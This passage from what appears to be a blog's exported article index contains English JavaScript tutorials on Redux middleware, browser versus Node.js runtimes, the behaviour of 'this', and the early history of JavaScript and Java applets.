already quite similar to the implementation of redux itself. In fact, the way middleware is written is the way redux requires it to be written. Finally, let’s take a look at how to use the official provided usage: import &#123; createStore, combineReducers, applyMiddleware &#125; from 'redux'; // applyMiddleware takes createStore() and returns // a function with a compatible API. // Note that here, we used currying. We changed the two parameters to two functions. // Originally, we passed in an array, but here we removed the array and just passed them in one by one. let createStoreWithMiddleware = applyMiddleware( logger, crashReporter )(createStore); // Use it like you would use createStore() let todoApp = combineReducers(reducers); // Replace the original createStore with createStoreWithMiddleware let store = createStoreWithMiddleware(todoApp); SummaryWhen I was reading the official documentation, I could understand everything until it suddenly jumped to the currying part. Because I was unfamiliar with this concept, I was confused. Later, I made up my mind to understand it, and after reading it again, I tried to understand what each line meant and how the process worked. After that, it became clearer. This article is heavily based on the official example, and the code is copied directly, but with some minor changes explained here. For example, in the applyMiddleware of the official example, there is actually: middlewares = middlewares.slice(); middlewares.reverse(); reverse() is because of the order of execution, and slice() is to copy the array. But I don’t know why it needs to be copied, maybe to avoid changing the original parameters? In short, I hope this article can help some beginners who are confused like me. I still recommend everyone to read the official documentation. If there are any mistakes in my writing, please leave a comment or send me an email. Thank you. Reference:http://camsong.github.io/redux-in-chinese/docs/advanced/Middleware.html","link":"/2015/09/03/en/javascript-redux-middleware-details-tutorial/"},{"title":"Understanding the Execution Environment (Runtime) in JavaScript","text":"I believe that in order to understand the JavaScript programming language, it is important to understand the concept of the “execution environment” or “runtime”. Many people are not aware of this concept, which can lead to differences in understanding of JavaScript or other technologies. Therefore, in this article, let’s talk about the execution environment. Note: In addition to “runtime”, “execution environment” is also used to refer to the same concept, but these two terms are completely different. To avoid confusion, we will use the term “runtime” throughout this article. Also, “runtime” has many meanings, but in this context, it refers to the runtime environment. The Function That Exists and Doesn’t ExistOur protagonist, Xiao Ming, received a requirement at work to encode a string in base64. In JavaScript, how do we convert a string to base64 encoding? There is a function called btoa that can do this. You can open the Chrome devtool console and enter the following code: console.log(btoa('hello')) // aGVsbG8= To convert a string from base64, simply change the function name to atob: console.log(atob('aGVsbG8=')) // hello Some people may be curious, like me, why the functions are named atob and btoa. I initially misunderstood that the “b” in atob stood for “base64”, so it was converting something to base64. But in fact, it is the opposite. atob converts a string from base64. According to the answer to Why were Javascript atob() and btoa() named like that?, “a” stands for ASCII and “b” stands for binary, not Base64. Therefore, atob means converting ASCII data (i.e., strings) to binary, which is to convert a base64-encoded string back to its original form. Although in JavaScript, both atob and btoa accept strings as parameters and there is no binary involved, the explanation above makes sense if you broaden your perspective beyond JavaScript. For example, base64 can convert any binary data to a string, which is its most valuable feature. For example, you may have used data URI, which is a way to encode images as base64 strings. Therefore, btoa stands for binary to ASCII, which means encoding anything using base64. The output will be a base64-encoded string. atob, on the other hand, means ASCII to binary, which is to convert a base64-encoded string back to its original form. Okay, after talking so much about base64, let’s get back to the point. Xiao Ming found out that he needed to use atob and btoa to complete the task and successfully implemented the feature on the webpage. Two months later, his supervisor asked him to implement the same feature on a server running Node.js. Xiao Ming thought, “What’s so difficult about this?” and used btoa as before. However, this time, a different result appeared, and an error was thrown: Uncaught ReferenceError: btoa is not defined Xiao Ming was puzzled. Why could he use the same function before but not now? Does this function exist and not exist in JavaScript at the same time? This happens because Xiao Ming did not have the concept of runtime in mind. What is Runtime?JavaScript is a programming language, so things like var, if else, for, or function are all part of JavaScript. But in addition to the language itself, JavaScript needs a place to run, and this place is called the execution environment or runtime. For example, the most commonly used runtime is the “browser”. So your JavaScript code runs on the browser runtime, which provides some things for you to use, such as the DOM (document), console.log, setTimeout, XMLHttpRequest, or fetch. These are not actually part of JavaScript (or more precisely, ECMAScript). These are provided by the browser, so we can only use them when running JavaScript on the browser. The atob and btoa used by Xiao Ming at the beginning are also not part of the ECMAScript specification, but are provided by the browser for JavaScript. This is why we suddenly can’t use them when using Node.js, because Node.js runtime does not provide these two functions. As shown in the figure below, the left is the Node.js runtime, the middle is the things of JS itself, and the right is the browser runtime, each with its own things: Therefore, you may have had a similar experience of not being able to execute the same code in Node.js. Now you know that this is because Node.js does not provide these things, such as document or atob, and you cannot use them directly in Node.js (if you can, it means you are using other libraries or polyfills). Conversely, when you run a JavaScript program using Node.js, you can use process or fs, but you cannot do this on the browser. Different runtimes provide different things, and you need to be very clear about which runtime you are in. How to distinguish whether a feature is provided by the runtime or built into JS?By following a principle, you can have a probability of about 80% to distinguish correctly, that is: “Is this feature related to the runtime itself?” For example, the DOM and BOM APIs are closely related to the browser. When using the Node.js runtime, we don’t have a document because there is no such thing as a page, and we don’t have localStorage because that is something only the browser has. Therefore, things like document and localStorage are provided by the browser, not things of the JavaScript language itself. Or like process, which can read a lot of information about threads, the browser cannot allow you to do this, so obviously it cannot be used on the browser, it is something exclusive to the Node.js runtime. The other 20% are some exceptions that appear to be unrelated to the runtime, but are actually related. For example, btoa just converts to Base64, what does it have to do with the runtime? But coincidentally, it is provided by the runtime. And console is also provided by the runtime, and there is a feature to note, that is, sometimes different runtimes will provide the same things. For example, console and setTimeout are available in both the browser and Node.js, but they are not part of JavaScript, but are provided by the runtime. But although they look the same, the internal implementation is completely different, and the way they behave may also be different. For example, the console.log in the browser will output to the console of the devtool, while Node.js will output to your terminal. setTimeout and setInterval are also like this, although they are available in both the browser and Node.js, the implementation behind them is completely different. If you want to confirm whether an API is provided by the runtime, there is a simple and correct way, which is to look at the ECMAScript specification or MDN. For example, for atob, in the Specifications section of MDN, you can see that its source is the HTML Standard, not ECMAScript, which means it is not part of ECMAScript: In short, if you cannot find it in the ECMAScript specification, it means it is provided by the runtime. On MDN, these are not provided natively by ECMAScript, but are provided by the browser’s API, called Web API: https://developer.mozilla.org/en-US/docs/Web/API Below are some APIs that are often misunderstood as part of JavaScript, but are actually provided by the runtime: console fetch performance URL setTimeout setInterval Learning JavaScript from Different RuntimesWhen many people learn JavaScript, the first thing they encounter is the browser, and they may leave the impression that “JavaScript can only run on the browser.” In addition to the browser, JavaScript also has another runtime called Node.js. The introduction on the official website is: Node.js® is a JavaScript runtime built on Chrome’s V8 JavaScript engine. Through the Node.js runtime, our JavaScript code can run independently of the browser. I highly recommend everyone to take a look at Node.js and use the APIs it provides, such as process or fs, to write some small toys. When you are familiar with different runtimes, you will find that the runtime is not only providing more APIs, but also a limiter. When your runtime is a browser, the functions you can perform will naturally be subject to browser restrictions. For example, you cannot “actively read” files on your computer because the browser does not allow you to do so for security reasons. You also cannot restart the computer because the browser does not allow you to do so. When performing network-related operations, you will also be subject to the restrictions of the same-origin policy and CORS, which are unique to the browser environment. Once you switch to a different runtime, all these restrictions will be lifted. When using Node.js to execute code, you can read files, restart the computer, and there are no restrictions on the same-origin policy and CORS. You can do whatever you want, send requests to anyone you want, and the response will not be intercepted. The reason why I recommend everyone to learn Node.js is to make everyone aware of who is imposing the restrictions when executing code. Is it the limitations of JavaScript itself or the limitations imposed by the runtime? After realizing this, your understanding of JavaScript will be more comprehensive. ConclusionWhen you use JavaScript, some APIs are built into the language itself, such as JSON.parse or Promise, and you can find their descriptions in the ECMAScript specification. Some APIs are provided by the runtime, such as atob, localStorage, or document, which are APIs provided by the browser. Once you leave the browser runtime, you will not have these APIs available. But this does not mean that APIs that can be used on both the browser and Node.js runtimes are built-in APIs of the language. For example, console, setTimeout, and the recently natively supported fetch in Node.js (https://github.com/nodejs/node/pull/41749) can be used on both the browser and Node.js, but they are all provided by the runtime. In other words, the browser implements the APIs of console and setTimeout, implements the timer mechanism, and provides them to JavaScript for use, and Node.js also implements the same APIs and provides them to JavaScript for use. Although they look like the same function on the surface, the implementation behind them is different. This is like you can buy tuna rice balls at both Family Mart and 7-11, although they are both tuna rice balls, the suppliers behind them are actually different, and the production methods are also different. With the concept of runtime, if you encounter a function that can be used in the browser but not in Node.js in the future, you will know why.","link":"/2022/02/09/en/javascript-runtime/"},{"title":"Understanding JavaScript's Number One Headache: this","text":"IntroductionIn JavaScript, there is a topic that is very difficult for beginners and even experienced developers to fully understand: “What is this?”. As a front-end engineer who uses JavaScript as a tool for a living, I have been struggling with this issue for a long time. I originally thought that I would never write an article about this. There are two reasons for this. First, there are already a lot of articles explaining this topic, and each one is written very well. After reading the What’s THIS in JavaScript ? series, I felt that the explanation was very complete. If I am not confident that I can explain it more clearly or from a different perspective, it seems unnecessary to write another article. The second reason is that if you want to “completely” understand this, the cost may be much higher than you think. Here, “completely” means that you can explain why the value of this is like this in any situation. Let me give you an example: var value = 1; var foo = &#123; value: 2, bar: function () &#123; return this.value; &#125; &#125; //範例1 console.log(foo.bar()); //範例2 console.log((foo.bar)()); //範例3 console.log((foo.bar = foo.bar)()); //範例4 console.log((false || foo.bar)()); //範例5 console.log((foo.bar, foo.bar)()); Can you answer it? If not, it means that you don’t “completely” understand this. The reason why the cost of completely understanding this is very high is because “completely understanding this” means “memorizing the ECAMScript specification”. The value of this is not something we imagine out of thin air. In fact, there is a complete definition behind it, which is the so-called ECMAScript specification. You must first understand this specification before you can fully understand the object referred to by this in each situation. If you really want to completely understand this, I recommend this article: JavaScript深入之从ECMAScript规范解读this. The example above is taken from this article. If you want to see the answer and understand why, you can read this article. Since I mentioned so many reasons why I shouldn’t write about this earlier, why did I still jump in and write about it? Because after reading so many articles and absorbing a lot of essence, I found that if there is a good entry point, this may not be so difficult to understand. With the method I teach in this article, you will not completely understand this. You may answer the five examples above incorrectly, but you can still solve the basic questions. This is also the origin of the title: “Not completely complete, but guaranteed to be easy to understand”. The purpose of this article is to provide a different perspective on this, starting from why there is this, and then using a set of rules to explain the value of this, at least so that you no longer misunderstand this and know what this is in some common situations. To talk about this, we must start with object-oriented programming(If you have no idea about object-oriented programming in JavaScript, you can first complete the relevant basics and read this article: It’s time to understand JavaScript’s prototype chain) If you have written other programming languages, you know that this is never a difficult thing. It represents the instance itself in object-oriented programming. Let me give you an example: class Car &#123; setName(name) &#123; this.name = name &#125; getName() &#123; return this.name &#125; &#125; const myCar = new Car() myCar.setName('hello') console.log(myCar.getName()) // hello In the above example, we declare a class Car and write two methods, setName and getName, using this.name to access the properties of this instance. Why write like this? Because this is the only way, where else do you want to store the property name? There is no other place for you to store it. So the role of this is obvious here, and it refers to the instance itself. In the above example, myCar.setName(&#39;hello&#39;), so this will be myCar. In the world of object-oriented programming, the role of this is so simple. Or in other words, I think: Once you leave object-oriented programming, this doesn’t really matter. Assuming that this can only be used in a class, there should be no problem, right? Have you seen anyone who writes Java or C++ complaining that this is difficult to understand? No, because the role of this is very simple. So what is the problem? The problem is that in JavaScript, you can access this anywhere. So the this in JavaScript is different from the one used in other programming languages, which is why this is difficult to understand. Although the definition of this is different, I think it is essentially similar. The first step to understanding this is to tell yourself: “Once you leave the object, you don’t need to pay much attention to the value of this, because it doesn’t make much sense.” Not much meaning of thisfunction hello()&#123; console.log(this) &#125; hello() What is the value of this? As we mentioned earlier, in this case, I will tell you that this has no meaning, and you should not think that this will point to the hello function. There is no such thing. Just remember what I said earlier: “When it is detached from the object, the value of this has no meaning.” In this meaningless situation, the value of this in the browser will be window, in node.js it will be global, and in strict mode, the value of this will be undefined. This rule should be easy to remember. Let me summarize it for you: In strict mode, it is always undefined. In non-strict mode, it is window in the browser. In non-strict mode, it is global in node.js. This is what you see in other articles as “default binding”, but I don’t intend to use any proprietary terms to talk about this in this article. I think that not using these terms will not hinder your understanding, and may even help you understand better. I’m not saying that proprietary terms are not important, but that you can learn the concepts first and then come back to supplement the proprietary terms. Once detached from the object, the value of this has no meaning, and in the case of no meaning, there will be a default value, which is also easy to remember. In strict mode, it is undefined, and in non-strict mode, it is the global object. Changing the value of thisAlthough this may have a default value, we can change it through some methods. There are three ways to change it. The first two are very similar and are called call and apply. Both of these are functions that can call a function. Let me give you an example: 'use strict'; function hello(a, b)&#123; console.log(this, a, b) &#125; hello(1, 2) // undefined 1 2 hello.call(undefined, 1, 2) // undefined 1 2 hello.apply(undefined, [1, 2]) // undefined 1 2 We have a function called hello, which logs the value of this and two parameters. When we call hello(1, 2), because it is in strict mode, this is undefined, and a and b are 1 and 2. When we call hello.call(undefined, 1, 2), we ignore the first parameter. You can see that it is actually the same as hello(1, 2). The difference with apply is that the parameters passed in are an array. So these three ways of calling a function are equivalent and exactly the same. In addition to directly calling the function, you can also use call or apply to call it, and the difference is in the way the parameters are passed. The difference between call and apply is that one is the same as calling a function normally, and the other is wrapped in an array. What is the first parameter we just ignored? You may have guessed that it is the value of this! 'use strict'; function hello(a, b)&#123; console.log(this, a, b) &#125; hello.call('yo', 1, 2) // yo 1 2 hello.apply('hihihi', [1, 2]) // hihihi 1 2 It’s that simple. Whatever you pass as the first parameter, the value of this inside will be that. Even if there is already a this, it will still be overridden by this method: class Car &#123; hello() &#123; console.log(this) &#125; &#125; const myCar = new Car() myCar.hello() // myCar instance myCar.hello.call('yaaaa') // yaaaa The value of this should have been the myCar instance, but it was overridden by the parameter we passed in when using call. In addition to the above two methods, there is one last way to change the value of this: bind. 'use strict'; function hello() &#123; console.log(this) &#125; const myHello = hello.bind('my') myHello() // my bind will return a new function. Here we bind the hello function with my, so when we call myHello(), it will output my. These are the three methods that can change the value of this. You may wonder what will happen if we use call and bind at the same time: 'use strict'; function hello() &#123; console.log(this) &#125; const myHello = hello.bind('my') myHello.call('call') // my The answer is that it will not change. Once it is bound with bind, the value will not change. One thing to note here is that in non-strict mode, if you pass a primitive as the parameter to call, apply, or bind, it will be converted to an object. For example: function hello() &#123; console.log(this) &#125; hello.call(123) // [Number: 123] const myHello = hello.bind('my') myHello() // [String: 'my'] Let’s summarize: this basically has no meaning outside of the object, and if forced to output, it will give a default value. this can be changed using call, apply, and bind. this in objectsAt the beginning, we demonstrated this in object-oriented classes, but in JavaScript, there is another way to create objects: const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125; &#125; obj.hello() // 1 This is different from the object-oriented example at the beginning. This example directly creates an object without using a class, so you won’t see the keyword new. Before we continue, remember one thing: The value of this has nothing to do with where the code is located in the scope, but only with “how you call it”. This mechanism is exactly the opposite of the scope. If you are not sure what I am talking about, you can read this article first: All functions are closures: talking about scope and closure in JS. Let’s review the scope with a simple example: var a = 10 function test()&#123; console.log(a) &#125; const obj = &#123; a: 'ojb', hello: function() &#123; test() // 10 &#125;, hello2: function() &#123; var a = 200 test() // 10 &#125; &#125; test() // 10 obj.hello() obj.hello2() No matter where I am or how I call the test function, the a it prints will always be the a of the global variable because that’s how the scope works. test cannot find a in its own scope, so it looks up one level, which is the global scope. This has nothing to do with where you call test. The scope of the test function is determined when it is “defined”. However, this is completely different. The value of this will vary depending on how you call it. Do you remember call, apply, and bind that we just talked about? This is one of the examples. You can call a function in different ways to make the value of this different. So you need to be very clear that these are two completely different operating modes, one is static (scope), and the other is dynamic (this). To see the scope, look at where the function is in the code; to see this, look at how the function is called. Let’s take the most common example: const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125; &#125; obj.hello() // 1 const hey = obj.hello hey() // undefined It’s obviously the same function, why is this.value 1 the first time it’s called and undefined the second time? Remember what I just said: “To see this, look at how the function is called.” Before we continue, let me teach you the most important trick I learned from What is this in JavaScript?, which is a very convenient method. In fact, we can convert all function calls into the form of call to see. For example, for the example above, it would be like this: const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125; &#125; obj.hello() // 1 obj.hello.call(obj) // 轉成 call const hey = obj.hello hey() // undefined hey.call() // 轉成 call The rule is that whatever you are before calling the function, you put it at the end. So obj.hello() becomes obj.hello.call(obj), and hey() has nothing in front of it, so it becomes hey.call(). After converting to this form, do you remember that the first parameter of call is this? So you can immediately know what the value of this is! Let’s take a more complicated example: const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125;, inner: &#123; value: 2, hello: function() &#123; console.log(this.value) &#125; &#125; &#125; const obj2 = obj.inner const hello = obj.inner.hello obj.inner.hello() obj2.hello() hello() You can think about what values each of the three functions will print. Now I’m going to reveal the answer. Just convert it to the form we just talked about: obj.inner.hello() // obj.inner.hello.call(obj.inner) => 2 obj2.hello() // obj2.hello.call(obj2) => 2 hello() // hello.call() => undefined I want to explain the last hello function in particular because nothing is passed in, so it is bound by default and is window in non-strict mode, so it logs window.value, which is undefined. As long as you convert the function call into the form of call, it is easy to see what the value of this is. This is also what I have been saying: “To see this, look at how the function is called”, and if you want to see how it is called, just convert it to the form of call. By now, you should be able to solve 90% of the problems related to this. Let’s try it out (for readability, there are no blank lines to avoid errors, so please scroll down to see the code, and the answer will be below): function hello() &#123; console.log(this) &#125; var a = &#123; value: 1, hello &#125; var b = &#123; value: 2, hello &#125; hello() a.hello() b.hello.apply(a) Just follow what we said before and convert it to the form of call: hello() // hello.call() => window（瀏覽器非嚴格模式） a.hello() // a.hello.call(a) => a b.hello.apply(a) => 直接用 apply，所以就是 a Here’s a different question, so be careful (assuming it’s running in a browser, non-strict mode): var x = 10 var obj = &#123; x: 20, fn: function() &#123; var test = function() &#123; console.log(this.x) &#125; test() &#125; &#125; obj.fn() If you get this question wrong, it must be because you forgot our most important sentence: To see this, look at how the function is called. How do we call test? test(), so it’s test.call() which is the default binding, and the value of this will be window, so this.x will be 10 because a global variable x = 10 is declared on the first line. To avoid forgetting what we talked about earlier, let’s review: this outside of an object basically has no meaning. Meaningless this will be given a default value based on strict mode and the environment. The default value under strict mode is undefined, and under non-strict mode in a browser, the default value is window. this can be changed using call, apply, and bind. To see this, look at how the function is called. You can think of a.b.c.hello() as a.b.c.hello.call(a.b.c), and so on, to easily find the value of this. Non-conformist Arrow FunctionsThe part about this should have ended above, but the arrow functions introduced in ES6 have a slightly different way of working. They don’t have their own this, so “the this at the place where it is declared is what its this is.” Okay, I know this sounds super confusing, let’s look at an example: const obj = &#123; x: 1, hello: function()&#123; // 這邊印出來的 this 是什麼，test 的 this 就是什麼 // 就是我說的： // 在宣告它的地方的 this 是什麼，test 的 this 就是什麼 console.log(this) const test = () => &#123; console.log(this.x) &#125; test() &#125; &#125; obj.hello() // 1 const hello = obj.hello hello() // undefined In the hello function on line 5, we declare the test arrow function, so the this of hello is what the this of test is. So when we call obj.hello(), the this of test will be obj; when we call hello(), the this of test will be the global object. This rule is actually the same as before, the only difference is that the this of arrow functions is not determined by themselves, but by the this at the place where they are declared. If you want to see more complex examples, you can refer to this article: Ironman Competition: Arrow Functions Practical Application: ReactIf you’ve written React, you’ll know that there are some concepts that today’s tutorial can be useful for. For example, we must bind some methods in the constructor, have you ever wondered why? Let’s first see what happens if we don’t bind: class App extends React.Component &#123; onClick() &#123; console.log(this, 'click') &#125; render() &#123; return &lt;button onClick=&#123;this.onClick&#125;>click&lt;/button> &#125; &#125; The value logged at the end will be undefined. Why? This detail depends on the React source code, only React knows how the onClick function we passed down is actually called. So why bind? To ensure that we always get the instance itself in onClick. class App extends React.Component &#123; constructor() &#123; super() // 所以當你把 this.onClick 傳下去時，就已經綁定好了 this // 而這邊的 this 就是這個 component this.onClick = this.onClick.bind(this) &#125; onClick() &#123; console.log(this, 'click') &#125; render() &#123; return &lt;button onClick=&#123;this.onClick&#125;>click&lt;/button> &#125; &#125; There is another way to use arrow functions: class App extends React.Component &#123; render() &#123; return &lt;button onClick=&#123;() => &#123; console.log(this) &#125;&#125;>click&lt;/button> &#125; &#125; Why can arrow functions also be used? Because as we mentioned earlier, “the this at the place where it is declared is what its this is,” so the this logged here will be the this of the render function, and the this of render is the component itself. If you’ve forgotten a bit, you can scroll to the top of the article, because we’ve already mentioned these things at the beginning. SummaryI’ve read at least a dozen or twenty articles on explaining this, the more common ones are about explaining different binding methods and when to use which binding. But I haven’t mentioned these in this article because I don’t think they affect understanding (but it’s best to supplement related terms later). I’ve been confused before, and this has confused me a lot. Recently, because of teaching, I had to understand this, and I really understand a lot more than before. From my experience, I think one of the reasons why this is complicated is that “you can use this outside of objects,” so I repeatedly emphasized that I think this outside of objects is meaningless. The time when I really understood this was when I saw What is the value of this?, which was really enlightening. Changing the general function call to the form of using call is an easy-to-understand and easy-to-remember method, and it can be applied in 90% of scenarios. Finally, I emphasize again that this article has omissions. The examples at the beginning cannot be explained with the knowledge learned in this article. You really have to look at ECMAScript. I also didn’t mention the this of browser events, but this part is relatively simple. I only hope that this article can give beginners who have been stuck in this for a long time some new ideas, and after reading this article, they can think about the value of this and its existence from different perspectives. After writing this article, I’ve explained almost all the questions about JavaScript that are very common but I didn’t understand before. Interested friends can refer to other topics: It’s time to understand JavaScript’s prototype chain In-depth discussion of parameter passing in JavaScript: call by value or reference? I know you understand hoisting, but do you understand it deeply enough? All functions are closures: talking about scope and closure in JS Reference: JavaScript Deep Dive: Understanding this from the ECMAScript Specification What is the value of this in JavaScript? Explained clearly What’s this in JavaScript? JS this","link":"/2019/02/23/en/javascript-what-is-this/"},{"title":"Understanding JavaScript from its history","text":"I believe that to truly understand JavaScript, we must start from its history. Why? Because by understanding its history, we can know why certain parts are designed in a certain way and why there are seemingly strange behaviors. Although some ancient knowledge may not have much practical use, it is very interesting to me. Learning its history is not about memorizing the year it appeared or how many days it took to develop and design, but rather understanding the context in which it appeared and why it was needed and designed in a certain way. If you want to learn about the history of JavaScript, my top recommendation is this resource: JavaScript: The First 20 Years, because Brendan Eich, the father of JavaScript, is also one of the authors. If you want to read the Chinese version, it is available here: JavaScript 20 Years. This book records the history of JavaScript from 1995 to 2015, a total of 20 years. If you have time, I strongly recommend that you read it all. It will give you a different understanding of JavaScript (and you will also learn a lot of interesting facts). Below, I will pick some of the more important things to write about. If there is no specific mention of the data source, it is from the book mentioned above, so it is normal if it seems familiar. Since I was born around the same time as JavaScript, I have not personally experienced the early history. If it seems like I have participated in it, it is all just imagination. The Birth of JavaScriptWhen reading history, I think there is a key point when talking about the years, which is to make everyone feel the same way, otherwise it is just cold words. In 1993, the well-known graphical browser Mosaic was born (it was well-known, but not the first). You may wonder why I emphasize the word “graphical”. Are there browsers that are purely text-based? Yes, there are. Browsers like Lynx, which appeared in 1992, or w3m, which was launched in 2011, are text-based browsers. If you use w3m to view my blog, it will look like this: If you are interested in trying it out, you can install w3m on a Linux system: apt-get install w3m, and then w3m https://blog.huli.tw to see it. Then, at the end of 1994, Netscape’s Netscape Navigator was launched and quickly expanded, becoming the dominant browser in just a few months. What was 1994 like? It was 13 years before the birth of the first iPhone, and the year before the birth of Windows 95. At that time, there was no such thing as a “mobile phone”, it was called a “cell phone”. The legendary Nokia 3310 was launched in 2000, which was six years later. Taiwan’s internet started with academic networks in 1985, and was officially connected to the world in 1991. HiNet was established in 1994, and Ptt was established in 1995. In 1994, none of these existed yet, indicating that it was a relatively early era and a time when the internet was just beginning to flourish. In such a rising market, everyone naturally wants to get a piece of the pie. In late 1994, Microsoft proposed a plan to acquire Netscape, but it was rejected. The management of Netscape realized at that time that they were likely to face competition from Microsoft in the future - the famous IE, which was launched in August 1995. At that time, Netscape originally wanted to add a scripting language to the browser. At the beginning of 1995, Sun brought the not-yet-officially-released Java to Netscape and reached a cooperation agreement to integrate Java into Netscape 2. The two companies joined forces to defeat Microsoft, and this became the Java Applet. I believe that many young people like me do not know what a Java Applet is. In short, you can write an application in Java, compile it, and put it on a webpage for the browser to execute Java. The advantage of this is that users do not need to download Java applications actively, and the browser will take care of it for you. You can see the Java Applet code from Wikipedia: import java.applet.Applet; import java.awt.*; // Applet code for the \"Hello, world!\" example. // This should be saved in a file named as \"HelloWorld.java\". public class HelloWorld extends Applet &#123; // This method is mandatory, but can be empty (i.e., have no actual code). public void init() &#123; &#125; // This method is mandatory, but can be empty.(i.e.,have no actual code). public void stop() &#123; &#125; // Print a message on the screen (x=20, y=10). public void paint(Graphics g) &#123; g.drawString(\"Hello, world!\", 20,10); // Draws a circle on the screen (x=40, y=30). g.drawArc(40,30,20,20,0,360); &#125; &#125; This code will draw a “Hello, World” on the screen. After compiling the above Java code, you can embed it in a webpage. &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"> &lt;HTML> &lt;HEAD> &lt;TITLE>HelloWorld_example.html&lt;/TITLE> &lt;/HEAD> &lt;BODY> &lt;H1>A Java applet example&lt;/H1> &lt;P>Here it is: &lt;APPLET code=\"HelloWorld.class\" WIDTH=\"200\" HEIGHT=\"40\"> This is where HelloWorld.class runs.&lt;/APPLET>&lt;/P> &lt;/BODY> &lt;/HTML> So why do we need a scripting language when we already have powerful web applications? Can’t we just use Java? The reason is that for some simple applications, using Java would be too cumbersome. For example, if you just want to do input field validation, you would have to learn about object-oriented class concepts and be familiar with the entire Java ecosystem before you can start writing the functionality you want, which could take more than 10 lines of boilerplate code. Therefore, in 1995, Brendan Eich, who joined Netscape, was tasked with developing a programming language that could run in a browser, be lightweight, and look like Java. Why should it look like Java? Because initially, it was born as an auxiliary language for Java, and this language was temporarily named Mocha. Due to time constraints, Brendan Eich spent ten days creating a prototype of Mocha. The demand from the upper level to “look like Java” also influenced the design of JavaScript. However, in addition to Java, JavaScript also referred to programming languages such as C, AWK, Scheme, and Self. Many people have heard the phrase “Java and JavaScript are like dogs and hot dogs,” but in reality, their origins may be deeper than you think, and not just following trends or having similar names. For example, many people may have encountered a strange design: console.log(new Date()) // Thu Aug 19 2021 22:55:22 GMT+0800 (台北標準時間) console.log(new Date().getMonth()) 7 It’s August, why is it logging as 7? Do you think this design is unique to JavaScript? No, it was copied from java.util.Date in JDK 1.0. This is the document at the time. So why did Java do this? Some people pointed out that it may be because in the older C’s localtime, the month starts from 0. More related resources can be found at: Why does the month argument range from 0 to 11 in JavaScript’s Date constructor? Javascript Date method inconsistency - getDate vs getMonth Regarding the reply from the father of JavaScript on these discussions, we can also see the demand for “JavaScript to look like Java”: In a press release released by Netscape in May 1995, JavaScript was officially launched, and the subtitle was: 28 INDUSTRY-LEADING COMPANIES TO ENDORSE JAVASCRIPT AS A COMPLEMENT TO JAVA FOR EASY ONLINE APPLICATION DEVELOPMENT This explains that JavaScript exists to assist Java. In this press release, we can also see many features of JavaScript, such as: JavaScript is analogous to Visual Basic in that it can be used by people with little or no programming experience to quickly construct complex applications. JavaScript’s design represents the next generation of software designed specifically for the Internet and is: 1.designed for creating network-centric applications2.complementary to and integrated with Java3.complementary to and integrated with HTML4.open and cross-platform. They liken JavaScript to Visual Basic, which is simple and easy to learn, and JavaScript is the bridge between Java Applet and HTML. You can think of Java Applet as a standalone application that exists outside of the webpage. If you want to change the content on the webpage, you need to use JavaScript as a bridge, as stated in the following paragraph: “With JavaScript, an HTML page might contain an intelligent form that performs loan payment or currency exchange calculations right on the client in response to user input. A multimedia weather forecast applet written in Java can be scripted by JavaScript to display appropriate images and sounds based on the current weather readings in a region.” JavaScript can exist independently as an aid to HTML, handling some basic logic, and can also be used with Java Applet. In early documents, there was a mention of how Java and JavaScript communicate with each other (referenced from Java-to-Javascript Communication). import netscape.javascript.*; import java.applet.*; import java.awt.*; class MyApplet extends Applet &#123; public void init() &#123; JSObject win = JSObject.getWindow(this); JSObject doc = (JSObject) win.getMember(\"document\"); JSObject loc = (JSObject) doc.getMember(\"location\"); String s = (String) loc.getMember(\"href\"); // document.location.href win.call(\"f\", null); // Call f() in HTML page &#125; &#125; It uses the JSObject object to obtain the DOM. Another tutorial webpage has a more complete example: /* Mastering JavaScript, Premium Edition by James Jaworski ISBN:078212819X Publisher Sybex CopyRight 2001 */ &lt;title>Accessing JavaScript from an applet&lt;/TITLE> &lt;form NAME=\"textForm\"> &lt;P>Enter some text and then click Display Text: &lt;INPUT TYPE=\"text\" NAME=\"textField\" SIZE=\"20\">&lt;/P> &lt;/FORM> &lt;APPLET CODE=\"ReadForm.class\" WIDTH=400 HEIGHT=100 NAME=\"readApp\" MAYSCRIPT> [The ReadForm Applet] &lt;/APPLET> //Reading a JavaScript Form (ReadForm.java) import java.applet.*; import java.awt.*; import java.awt.event.*; import netscape.javascript.JSObject; import netscape.javascript.JSException; public class ReadForm extends Applet &#123; String text=\"Enter some text for me to display!\"; Font font = new Font(\"TimesRoman\",Font.BOLD+Font.ITALIC,24); JSObject win, doc, form, textField; public void init() &#123; win = JSObject.getWindow(this); doc = (JSObject) win.getMember(\"document\"); form = (JSObject) doc.getMember(\"textForm\"); textField = (JSObject) form.getMember(\"textField\"); setLayout(new BorderLayout()); Panel buttons = new Panel(); Button displayTextButton = new Button(\"Display Text\"); displayTextButton.addActionListener(new ButtonEventHandler()); buttons.add(displayTextButton); add(\"South\",buttons); &#125; public void paint(Graphics g) &#123; g.setFont(font); g.drawString(text,30,30); &#125; class ButtonEventHandler implements ActionListener &#123; public void actionPerformed(ActionEvent e)&#123; String s = e.getActionCommand(); if(\"Display Text\".equals(s)) &#123; text= (String) textField.getMember(\"value\"); win.eval(\"alert(\\\"This alert comes from Java!\\\")\"); repaint(); &#125; &#125; &#125; &#125; There is another interesting paragraph in the press release: “A server-side JavaScript script might pull data out of a relational database and format it in HTML on the fly. A page might contain JavaScript scripts that run on both the client and the server. On the server, the scripts might dynamically compose and format HTML content based on user preferences stored in a relational database, and on the client, the scripts would glue together an assortment of Java applets and HTML form elements into a live interactive user interface for specifying a net-wide search for information.” If you’re too lazy to read it, the keyword is “A page might contain JavaScript scripts that run on both the client and the server.” Did I read it correctly? In 1995, JavaScript could run on the server side? Yes, that’s right. My beloved JavaScript had already dominated the full stack 25 years ago. The code looks like this: It looks a bit like PHP, where you can embed code that will be executed on the backend and output the result. If you’re interested in this, the original historical documents are still available, and the following documents will guide you step by step on how to write a backend application using JavaScript: Server-Side JavaScript Reference Writing Server-Side JavaScript Applications If you want to learn more about this history, you can refer to Server-side JavaScript a decade before Node.js with Netscape LiveWire. If you want to search for information, you can use Netscape LiveWire as a keyword, not just LiveWire JS, because you will find Laravel Livewire, a full-stack framework based on Laravel. ConclusionJava and JavaScript are indeed two different programming languages. Although the name JavaScript was chosen for marketing reasons, it cannot be denied that some of its features were 